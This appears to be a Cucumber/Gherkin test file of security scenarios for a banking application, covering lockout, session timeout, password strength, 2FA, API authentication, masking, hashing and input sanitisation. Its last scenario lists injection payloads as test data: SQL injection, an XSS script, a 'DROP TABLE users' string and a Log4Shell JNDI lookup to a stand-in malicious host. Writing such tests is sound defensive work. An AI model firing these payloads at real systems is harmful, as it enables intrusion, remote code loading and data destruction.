Feature: Banking Application Security
  As a bank
  I want to ensure my application has strong security measures
  So that customer data and transactions are protected

  Background:
    Given the banking application is accessible

  @security @critical
  Scenario: Failed login attempts should lock the account
    Given I am on the login page
    When I enter username "securitytest" and incorrect password "WrongPass123!" 5 times
    Then my account should be locked
    And I should see a message "Your account has been locked for security reasons"

  @security @critical
  Scenario: Session timeout after inactivity
    Given I am logged into my bank account
    When I am inactive for 15 minutes
    Then I should be redirected to the login page
    And I should see a message "Your session has expired due to inactivity"

  @security
  Scenario: Password change requires current password verification
    Given I am logged into my bank account
    When I navigate to the change password page
    And I enter a new password without providing the current password
    Then the password change should be rejected
    And I should see an error message "Current password is required"

  @security @regulatory
  Scenario: Strong password requirements enforcement
    Given I am on the registration page
    When I try to set each of the following passwords
      | password        | should_accept |
      | password        | false         |
      | Password        | false         |
      | Password1       | false         |
      | Password#       | false         |
      | Password#1      | true          |
      | LongPassword#1  | true          |
    Then only strong passwords should be accepted
    And I should see appropriate error messages for weak passwords

  @security @2fa
  Scenario: Two-factor authentication can be enabled
    Given I am logged into my bank account
    And I have not enabled 2FA
    When I navigate to the security settings page
    And I enable two-factor authentication
    Then I should receive a setup code
    And I should be able to verify the setup with a valid authentication code
    And my account should have 2FA enabled

  @security @api
  Scenario: API authentication should require valid token
    Given I have an API client
    When I attempt to access the account data without authentication
    Then the API should return a 401 Unauthorized status
    And the response should include the message "Authentication required"

  @security @regulatory
  Scenario: Sensitive data should be masked in the UI
    Given I am logged into my bank account
    When I view my account details
    Then sensitive information should be masked:
      | field          | masking_pattern      |
      | account_number | Last 4 digits visible |
      | SSN            | Last 4 digits visible |
      | card_number    | Last 4 digits visible |

  @security @encryption
  Scenario: Passwords should be properly hashed in the database
    Given I have access to the user database
    When I retrieve the password field for user "securitytest"
    Then the password should be stored as a secure hash
    And the original password should not be recoverable

  @security @injection
  Scenario Outline: Input fields should be protected against injection attacks
    Given I am on the login page
    When I enter the username "<injection_string>"
    Then the application should sanitize the input
    And no error revealing the implementation should be displayed

    Examples:
      | injection_string                            |
      | ' OR 1=1 --                                 |
      | <script>alert('XSS')</script>               |
      | admin'; DROP TABLE users; --                |
      | ${jndi:ldap://malicious-server.com/exploit} |
